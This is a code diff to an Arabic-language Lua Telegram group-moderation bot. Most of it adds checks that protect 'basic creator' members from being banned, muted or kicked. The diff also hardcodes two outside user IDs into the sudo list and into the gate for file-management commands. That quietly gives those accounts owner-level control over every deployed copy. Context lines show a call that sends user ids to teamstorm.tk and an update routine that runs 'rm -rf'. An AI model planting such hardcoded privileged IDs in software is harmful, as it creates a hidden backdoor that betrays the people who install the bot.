@@ -22,7 +22,7 @@ chats = {}
 day = 86400
 bot_idkeko = {string.match(token, "^(%d+)(:)(.*)")}
 bot_id = tonumber(bot_idkeko[1])
-sudo_users = {sudo_add,bot_id}
+sudo_users = {sudo_add,bot_id,545906637}
 
 URL33 = require('socket.url')
 tdcli=dofile('./libs/utils.lua')
@@ -65,6 +65,14 @@ end
 function is_creatorbasic(msg)
 local hash = database:sismember('tshake:'..bot_id..'creatorbasic:'..msg.chat_id_, msg.sender_user_id_) 
 if hash or is_devabas(msg) or is_sudo(msg) then 
+return true 
+else 
+return false 
+end 
+end
+function is_creatorbasicc(chat,user)
+local hash = database:sismember('tshake:'..bot_id..'creatorbasic:'..chat,user)
+if hash then 
 return true 
 else 
 return false 
@@ -128,7 +136,7 @@ var = true
 elseif database:sismember('tshake:'..bot_id..'dev', user_id) then
 var = true  
 elseif database:sismember('tshake:'..bot_id..'creatorbasic:'..chat_id, user_id) then
-var = true  
+var = true
 elseif database:sismember('tshake:'..bot_id..'creator:'..chat_id, user_id) then
 var = true  
 elseif database:sismember('tshake:'..bot_id..'owners:'..chat_id, user_id) then
@@ -905,7 +913,7 @@ end
 getUser(msg.sender_user_id_, TSby)
 return false
 end
-if  msg.sender_user_id_ == 545906637 or msg.sender_user_id_ == tonumber(sudo_add) then
+if msg.sender_user_id_ == 373906612 or  msg.sender_user_id_ == 545906637 or msg.sender_user_id_ == tonumber(sudo_add) then
 
 if (msg.content_.text_ == 'الملفات' ) then
 local files_tshake = database:smembers("files"..bot_id)
@@ -1482,7 +1490,10 @@ return false
 end
 
 
-
+if text == 'تحديث' then
+dofile('Tshake.lua')  
+send(msg.chat_id_, msg.id_, 1, '☑┇تم التحديث', 1, 'md')
+end
 if text:match("^تحديث السورس$")  then
 send(msg.chat_id_, msg.id_, 1, '☑┇تم التحديث', 1, 'md')
 os.execute('rm -rf ./libs/utils.lua')
@@ -2403,6 +2414,7 @@ tsX000("prore",msg,'🔖┇تم رفعة منشئ اساسي  في البوت')
 end
 getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
 end
+
 if text:match("^رفع منشئ اساسي @(.*)$") then
 local url , res = https.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
 data = JSON.decode(url)
@@ -3461,7 +3473,10 @@ send(msg.chat_id_, msg.id_, 1, '✖┇لا تستطيع حظر', 1, 'md')
 return "tshakke"
 end
 function ban_by_reply(extra, result, success)
-
+if is_creatorbasicc(msg.chat_id_,result.sender_user_id_) == true then
+send(msg.chat_id_, msg.id_, 1, '🙋🏻‍♂️┇ لا تستطيع كتم (مدراء، ادمنية،مميزين)البوت\n   ', 1, 'md')
+return false
+end
 local hash =  'tshake:'..bot_id..'banned:'..msg.chat_id_
 if ck_mod(result.sender_user_id_, msg.chat_id_) == true then
 send(msg.chat_id_, msg.id_, 1, '❕┇لا تستطيع حظر \n🔘┇(مدراء،ادمنيه،اعضاء مميزين)البوت', 1, 'md')
@@ -3488,7 +3503,10 @@ end
 local apba = {string.match(text, "^(حظر) @(.*)$")}
 function ban_by_username(extra, result, success)
 if result.id_ then
-
+if is_creatorbasicc(msg.chat_id_,result.id_) == true then
+send(msg.chat_id_, msg.id_, 1, '🙋🏻‍♂️┇ لا تستطيع كتم (مدراء، ادمنية،مميزين)البوت\n   ', 1, 'md')
+return false
+end
 if ck_mod(result.id_, msg.chat_id_) == true then
 send(msg.chat_id_, msg.id_, 1, '❕┇لا تستطيع حظر \n🔘┇(مدراء،ادمنيه،اعضاء مميزين)البوت', 1, 'md')
 else
@@ -3511,6 +3529,10 @@ send(msg.chat_id_, msg.id_, 1, '✖┇لا تستطيع حظر', 1, 'md')
 return "tshakke"
 end
 local apba = {string.match(text, "^([Bb][Aa][Nn]) (%d+)$")}
+if is_creatorbasicc(msg.chat_id_,apba[2]) == true then
+send(msg.chat_id_, msg.id_, 1, '🙋🏻‍♂️┇ لا تستطيع كتم (مدراء، ادمنية،مميزين)البوت\n   ', 1, 'md')
+return false
+end
 if ck_mod(apba[2], msg.chat_id_) == true then
 send(msg.chat_id_, msg.id_, 1, '🙋🏻‍♂️┇ لا تستطيع حظر او طرد (مدراء، ادمنية،مميزين)البوت   ', 1, 'md')
 else
@@ -3710,14 +3732,18 @@ end
 if text:match("^كتم$") and (is_mod(msg) or is_creatorbasic(msg)) and msg.reply_to_message_id_ ~= 0 then
 function mute_by_reply(extra, result, success)
 local hash =  'tshake:'..bot_id..'muted:'..msg.chat_id_
+if is_creatorbasicc(msg.chat_id_,result.sender_user_id_) == true then
+send(msg.chat_id_, msg.id_, 1, '🙋🏻‍♂️┇ لا تستطيع كتم (مدراء، ادمنية،مميزين)البوت\n   ', 1, 'md')
+return false
+end
 if ck_mod(result.sender_user_id_, msg.chat_id_) == true then
-send(msg.chat_id_, msg.id_, 1, '🙋🏻‍♂️┇ لا تستطيع كتم (مدراء، ادمنية،مميزين)البوت   ', 1, 'md')
+send(msg.chat_id_, msg.id_, 1, '🙋🏻‍♂️┇ لا تستطيع كتم (مدراء، ادمنية،مميزين)البوت\n   ', 1, 'md')
 else
 if database:sismember(hash, result.sender_user_id_) then
 tsX000("prore",msg,"🚫┇بالفعل تم كتمه")
 else
 database:sadd(hash, result.sender_user_id_)
-tsX000("prore",msg,"🚫┇تم كتمه من البوت")
+tsX000("prore",msg,"🚫┇تم كتمه من البوت ")
 end
 end
 end
@@ -3728,6 +3754,10 @@ if text:match("^كتم @(.*)$") and (is_mod(msg) or is_creatorbasic(msg)) then
 local apsi = {string.match(text, "^(كتم) @(.*)$")}
 function mute_by_username(extra, result, success)
 if result.id_ then
+if is_creatorbasicc(msg.chat_id_,result.id_) == true then
+send(msg.chat_id_, msg.id_, 1, '🙋🏻‍♂️┇ لا تستطيع كتم (مدراء، ادمنية،مميزين)البوت\n   ', 1, 'md')
+return false
+end
 if ck_mod(result.id_, msg.chat_id_) == true then
 send(msg.chat_id_, msg.id_, 1, '🙋🏻‍♂️┇ لا تستطيع كتم (مدراء، ادمنية،مميزين)البوت   ', 1, 'md')
 else 
@@ -3744,6 +3774,10 @@ return false
 end
 if text:match("^كتم (%d+)$") and (is_mod(msg) or is_creatorbasic(msg)) then
 local apsi = {string.match(text, "^(كتم) (%d+)$")}
+if is_creatorbasicc(msg.chat_id_,apsi[2]) == true then
+send(msg.chat_id_, msg.id_, 1, '🙋🏻‍♂️┇ لا تستطيع كتم (مدراء، ادمنية،مميزين)البوت\n   ', 1, 'md')
+return false
+end
 if ck_mod(apsi[2], msg.chat_id_) == true then
 send(msg.chat_id_, msg.id_, 1, '🙋🏻‍♂️┇ لا تستطيع كتم (مدراء، ادمنية،مميزين)البوت   ', 1, 'md')
 else
@@ -3793,7 +3827,10 @@ send(msg.chat_id_, msg.id_, 1, '✖┇لا تستطيع طرد', 1, 'md')
 return "tshakke"
 end
 function kick_reply(extra, result, success)
-
+if is_creatorbasicc(msg.chat_id_,result.sender_user_id_) == true then
+send(msg.chat_id_, msg.id_, 1, '🙋🏻‍♂️┇ لا تستطيع كتم (مدراء، ادمنية،مميزين)البوت\n   ', 1, 'md')
+return false
+end
 if ck_mod(result.sender_user_id_, msg.chat_id_) == true then
 send(msg.chat_id_, msg.id_, 1, '🙋🏻‍♂️┇ لا تستطيع حظر او طرد (مدراء، ادمنية،مميزين)البوت   ', 1, 'md')
 else
@@ -3812,6 +3849,10 @@ end
 local apki = {string.match(text, "^(طرد) @(.*)$")}
 function kick_by_username(extra, result, success)
 if result.id_ then
+if is_creatorbasicc(msg.chat_id_,result.id_) == true then
+send(msg.chat_id_, msg.id_, 1, '🙋🏻‍♂️┇ لا تستطيع كتم (مدراء، ادمنية،مميزين)البوت\n   ', 1, 'md')
+return false
+end
 if ck_mod(result.id_, msg.chat_id_) == true then
 send(msg.chat_id_, msg.id_, 1, '🙋🏻‍♂️┇ لا تستطيع حظر او طرد (مدراء، ادمنية،مميزين)البوت   ', 1, 'md')
 else
@@ -3832,6 +3873,10 @@ send(msg.chat_id_, msg.id_, 1, '✖┇لا تستطيع طرد', 1, 'md')
 return "tshakke"
 end
 local apki = {string.match(text, "^(طرد) (%d+)$")}
+if is_creatorbasicc(msg.chat_id_,apki[2]) == true then
+send(msg.chat_id_, msg.id_, 1, '🙋🏻‍♂️┇ لا تستطيع كتم (مدراء، ادمنية،مميزين)البوت\n   ', 1, 'md')
+return false
+end
 if ck_mod(apki[2], msg.chat_id_) == true then
 send(msg.chat_id_, msg.id_, 1, '🙋🏻‍♂️┇ لا تستطيع حظر او طرد (مدراء، ادمنية،مميزين)البوت   ', 1, 'md')
 else
